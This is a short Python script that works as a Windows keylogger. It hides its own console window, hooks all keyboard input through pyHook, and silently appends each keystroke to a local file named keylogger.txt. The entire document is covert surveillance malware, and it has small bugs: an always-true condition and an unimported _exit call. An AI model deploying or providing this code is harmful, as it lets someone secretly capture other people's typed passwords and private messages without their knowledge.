import win32api
import win32console
import win32gui
import pythoncom
import pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeyboardEvent(event):
    if event.Ascii == 5:
        _exit(1)
    if event.Ascii != 0 or 8:
        f = open('keylogger.txt', 'a')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '\n'
        f.write(keylogs)
        f.close()

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
